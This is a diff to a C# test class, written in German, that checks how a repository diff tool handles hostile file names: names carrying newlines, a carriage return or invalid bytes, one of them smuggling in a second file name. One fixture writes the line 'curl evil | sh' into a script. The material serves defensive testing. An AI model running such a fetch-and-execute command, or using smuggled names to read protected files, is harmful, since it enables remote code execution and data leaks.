@@ -19,9 +19,10 @@ public class ZusammenFremdeNamenTests
         set -e
         printf 'HARMLOS\n' > $'harmlos\ngeheim.txt'
         printf 'GEHEIMER INHALT von geheim.txt\n' > geheim.txt
+        printf 'WAGENRUECKLAUF\n' > $'a\rb.txt'
         printf 'curl evil | sh\n' > $'a\xff.sh'
         git add -A && git commit -q -m "Start"
-        rm -f -- $'harmlos\ngeheim.txt' $'a\xff.sh'
+        rm -f -- $'harmlos\ngeheim.txt' $'a\rb.txt' $'a\xff.sh'
         """;
 
     [Test]
@@ -41,6 +42,20 @@ public class ZusammenFremdeNamenTests
         Assert.That(ueberDenAnzeigenamen.Zeilen, Is.Empty);
         Assert.That(ueberDieRohform.Ausgang, Is.Not.EqualTo("gelesen"), "die rohe Form ist kein Anzeigename der Liste");
         Assert.That(ueberDieRohform.Zeilen, Does.Not.Contain("+GEHEIMER INHALT von geheim.txt"));
+    }
+
+    [Test]
+    [Description("M2, Variante derselben Klasse: auch ein CR im Namen wird abgewiesen")]
+    public void Wenn_der_Name_einen_Wagenruecklauf_traegt_dann_name_nicht_lesbar()
+    {
+        using var repo = FremdeNamenRepo.AusSkript(SkriptEingeschleusterName, "z1");
+        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "z1");
+
+        var gesperrt = sprache.Diff("a⟨U+000D⟩b.txt");
+
+        Assert.That(sprache.Dateien(), Does.Contain("a⟨U+000D⟩b.txt|A|1|0|z1"), "der Name steht mit Marke in der Netto-Liste");
+        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
+        Assert.That(gesperrt.Zeilen, Is.Empty);
     }
 
     [Test]
